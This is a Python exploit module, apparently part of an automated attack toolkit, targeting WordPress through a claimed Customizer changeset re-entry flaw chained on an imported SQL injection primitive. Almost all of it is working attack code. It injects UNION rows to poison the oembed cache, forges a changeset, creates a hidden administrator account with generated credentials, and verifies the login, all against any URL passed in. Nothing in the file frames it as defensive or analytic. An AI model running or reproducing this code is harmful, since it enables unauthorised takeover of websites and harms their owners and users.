# -*- coding: utf-8 -*-
# CVE-2026-60137 — WordPress Customizer Changeset Re-entry -> Priv Esc
# Depends on CVE-2026-63030 SQLi primitive.
# Function-only refactor. No import side-effects.
# Usage:
#     from function.cve_2026_60137 import exploit
#     r = exploit('http://target.com')
#     if r['exploited']:
#         e = r['evidence']
#         print(e['login_url'], e['username'], e['password'])
# Coded by HanJsXploit — refactored
import json
import secrets
import time
import uuid

from .cve_2026_63030 import (
    Client, Desync, UnionExtractor,
    sql_post_row, oembed_cache_key, sql_hex,
    find_embed_url, discover_prefix, discover_admin_id,
    POST_DATE, EMBED_WIDTH, EMBED_HEIGHT,
)

CVE_ID = 'CVE-2026-60137'
DEFAULT_TIMEOUT = 30.0
FAKE_ID_BASE = 1_800_000_000


# ────────────── poison graph ──────────────
class PoisonGraph:
    def __init__(self, cache_post_ids, admin_id):
        self.cache_post_ids = cache_post_ids
        self.admin_id = admin_id
        base = FAKE_ID_BASE + secrets.randbelow(100_000_000)
        self.outer_id = base
        self.inner_id = base + 1
        self.changeset_id = cache_post_ids[0]
        self.oembed_id = cache_post_ids[1]
        self.navitem_id = cache_post_ids[2]
        self.reentry_id = cache_post_ids[3]

    def build_rows(self, changeset_json, embed_url):
        oembed_id_expr = (
            f"IF((@_wp2s:=IFNULL(@_wp2s,0)+1)=1,"
            f"{self.oembed_id},2000000000)"
        )
        embed_content = (
            f'[embed width="{EMBED_WIDTH}" height="{EMBED_HEIGHT}"]'
            f'{embed_url}'
            f'[/embed]'
        )
        rows = [
            sql_post_row(0, content=embed_content, title="trigger", slug="trigger"),
            sql_post_row(self.changeset_id, content=changeset_json,
                         title="changeset", status="future",
                         slug=str(uuid.uuid4()), parent=self.outer_id,
                         post_type="customize_changeset"),
            sql_post_row(self.outer_id, title="outer", status="draft",
                         slug="outer", parent=self.changeset_id),
            sql_post_row(oembed_id_expr, title="oembed", slug="oembed",
                         parent=self.changeset_id),
            sql_post_row(self.navitem_id, title="navitem", slug="navitem",
                         post_type="nav_menu_item"),
            sql_post_row(self.reentry_id, title="reentry", status="parse",
                         slug="reentry", parent=self.inner_id,
                         post_type="request"),
            sql_post_row(self.inner_id, title="inner", status="draft",
                         slug="inner", parent=self.reentry_id),
        ]
        return " UNION ALL ".join(rows)


def _build_changeset(graph):
    setting_key = f"nav_menu_item[{graph.navitem_id}]"
    data = {
        setting_key: {
            "value": {
                "object_id": graph.inner_id,
                "object": "post",
                "menu_item_parent": 0,
                "position": 1,
                "type": "post_type",
                "title": "", "url": "", "description": "",
                "attr_title": "", "target": "", "classes": "", "xfn": "",
                "status": "publish",
                "nav_menu_term_id": 0,
                "_invalid": False,
            },
            "type": "nav_menu_item",
            "user_id": graph.admin_id,
        }
    }
    return json.dumps(data, separators=(",", ":"))


# ────────────── exploit stages ──────────────
def _seed_oembed(desync, embed_url, token):
    urls = [f"{embed_url}#{token}{i}" for i in range(4)]
    content = "".join(
        f'[embed width="{EMBED_WIDTH}" height="{EMBED_HEIGHT}"]'
        f'{u}[/embed]'
        for u in urls
    )
    row = sql_post_row(0, content=content, title="seed", slug="seed")
    resp = desync.union_inject(row)
    return resp.status in (200, 207, 400, 404)


def _extract_cache_ids(embed_url, token, extractor, prefix):
    ids = []
    for i in range(4):
        url = f"{embed_url}#{token}{i}"
        key = oembed_cache_key(url)
        expr = (
            f"SELECT ID FROM {prefix}posts "
            f"WHERE post_type='oembed_cache' AND post_name='{key}' LIMIT 1"
        )
        pid = extractor.integer(expr)
        if pid == 0:
            return None
        ids.append(pid)
    return ids


def _escalate(desync, client_timeout, cache_post_ids, embed_url, token,
              admin_id, username, password, email):
    graph = PoisonGraph(cache_post_ids, admin_id)
    changeset_json = _build_changeset(graph)
    trigger_url = f"{embed_url}#{token}1"
    union_rows = graph.build_rows(changeset_json, trigger_url)

    user_body = {
        "username": username,
        "password": password,
        "email": email,
        "roles": ["administrator"],
    }
    resp = desync.union_inject(
        union_rows,
        tail_requests=[{"method": "POST", "path": "/wp/v2/users", "body": user_body}],
        timeout=client_timeout * 2,
    )
    return _check_creation(resp), resp


def _check_creation(resp):
    try:
        data = resp.json()
        if "responses" in data:
            outer = data["responses"]
            if len(outer) > 1 and "responses" in outer[1].get("body", {}):
                for r in outer[1]["body"]["responses"]:
                    if isinstance(r, dict) and r.get("status") == 201:
                        return True
    except Exception:
        pass
    return False


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, verify_login=True, debug=False,
            timeout=DEFAULT_TIMEOUT, proxy=None):
    """
    Exploit CVE-2026-60137 (Customizer changeset re-entry -> admin user).

    Args:
        target_url   : str  — 'http://x.com', 'x.com'
        verify_login : bool — True → coba login dengan kredensial baru
        debug        : bool — collect step log ke result['log']
        timeout      : float — per-request timeout
        proxy        : str  — optional HTTP proxy

    Returns:
        dict standar + evidence:
          exploited=True  -> admin user dibuat (dan login verified kalau verify_login=True)
          evidence        -> {'type': 'creds', 'login_url', 'username', 'password', 'verified': bool}
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'n/a',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': '',
        'detail': '',
        'exploited': False,
        'log': [],
        'evidence': None,
    }
    log = res['log']

    def _step(msg):
        if debug:
            log.append(msg)

    if not target_url or not target_url.strip():
        res['detail'] = 'empty target'
        return res
    t = target_url.strip()
    if not t.startswith(('http://', 'https://')):
        t = 'http://' + t
    res['target'] = t

    try:
        client = Client(t, timeout=timeout, proxy=proxy)
        res['endpoint'] = client.batch_url

        # 1. verify SQLi primitive
        desync = Desync(client)
        extractor = UnionExtractor(desync)
        if not extractor.available():
            res['detail'] = 'CVE-2026-63030 primitive not available (target not vulnerable or patched)'
            return res
        res['vulnerable'] = True
        _step('SQLi primitive ok')

        prefix = discover_prefix(extractor, 'wp_')
        admin_id = discover_admin_id(extractor, prefix)
        embed_url = find_embed_url(client)
        _step(f'prefix={prefix} admin_id={admin_id} embed={embed_url}')

        # 2. seed oembed cache
        token = secrets.token_hex(6)
        if not _seed_oembed(desync, embed_url, token):
            res['detail'] = 'failed to seed oembed_cache via UNION'
            return res
        _step('oembed seeded')
        time.sleep(0.5)

        # 3. resolve cache IDs
        cache_ids = _extract_cache_ids(embed_url, token, extractor, prefix)
        if not cache_ids:
            res['detail'] = 'failed to resolve oembed_cache post IDs (cache disabled?)'
            return res
        _step('cache ids: ' + str(cache_ids))

        # 4. priv-esc via changeset re-entry
        username = 'wp_admin_' + secrets.token_hex(3)
        password = secrets.token_urlsafe(16)
        email = f'{username}@local.host'
        ok, _ = _escalate(desync, timeout, cache_ids, embed_url, token,
                          admin_id, username, password, email)
        if not ok:
            res['detail'] = 'changeset re-entry failed (creation not observed)'
            return res
        _step('admin user creation response ok')

        evidence = {
            'type': 'creds',
            'login_url': f'{client.base_url}/wp-login.php',
            'username': username,
            'password': password,
            'verified': False,
        }

        # 5. verify login
        if verify_login:
            time.sleep(1)
            evidence['verified'] = client.login(username, password)
            if not evidence['verified']:
                res['detail'] = 'user created but login failed'
                res['evidence'] = evidence
                res['output'] = username + ':' + password
                res['exploited'] = True   # user created = exploited walau login gagal
                return res
            _step('login verified')

        res['exploited'] = True
        res['evidence'] = evidence
        res['output'] = username + ':' + password
        res['detail'] = 'admin user created' + ('' if not verify_login else ' + login verified')
        return res
    except Exception as e:
        res['detail'] = 'unhandled: ' + str(e)[:200]
        return res